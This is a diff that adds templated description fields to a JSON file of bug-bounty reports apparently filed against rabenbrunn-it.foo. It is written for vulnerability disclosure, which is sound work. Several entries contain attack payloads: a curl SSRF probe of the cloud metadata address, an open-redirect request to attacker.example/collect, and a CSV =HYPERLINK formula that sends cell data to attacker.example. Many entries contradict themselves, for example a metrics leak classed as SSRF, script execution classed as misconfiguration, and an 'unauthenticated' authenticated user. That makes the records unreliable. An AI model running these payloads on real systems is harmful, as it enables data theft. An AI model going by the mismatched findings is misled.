+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4709,7 +4745,8 @@
           "offset": "6d",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rabenbrunn-it.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4841,7 +4878,8 @@
           "offset": "1d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rabenbrunn-it.foo/profile`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4977,7 +5015,8 @@
           "offset": "6d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5117,7 +5156,8 @@
           "offset": "3d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5230,7 +5270,8 @@
           "offset": "1d 22h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5382,7 +5423,8 @@
           "offset": "3d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rabenbrunn-it.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5554,7 +5596,8 @@
           "offset": "7d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5681,7 +5724,8 @@
           "offset": "6d 9h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5819,7 +5863,8 @@
           "offset": "2d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5951,7 +5996,8 @@
           "offset": "9d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6086,7 +6132,8 @@
           "offset": "4d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6229,7 +6276,8 @@
           "offset": "7d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rabenbrunn-it.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6372,7 +6420,8 @@
           "offset": "8d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6449,7 +6498,8 @@
           "offset": "2d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6548,7 +6598,8 @@
           "offset": "1d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6704,7 +6755,8 @@
           "offset": "6d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6798,7 +6850,8 @@
           "offset": "18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6941,7 +6994,8 @@
           "offset": "4d 8h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7064,7 +7118,8 @@
           "offset": "5d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7159,7 +7214,8 @@
           "offset": "11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7270,7 +7326,8 @@
           "offset": "1d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7397,7 +7454,8 @@
           "offset": "8d 9h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7525,7 +7583,8 @@
           "offset": "1d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7656,7 +7715,8 @@
           "offset": "5d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rabenbrunn-it.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7800,7 +7860,8 @@
           "offset": "6d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rabenbrunn-it.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7968,7 +8029,8 @@
           "offset": "3d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8120,7 +8182,8 @@
           "offset": "2d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rabenbrunn-it.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8227,7 +8290,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8347,7 +8411,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rabenbrunn-it.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8439,7 +8504,8 @@
           "offset": "1d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8542,7 +8608,8 @@
           "offset": "2d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
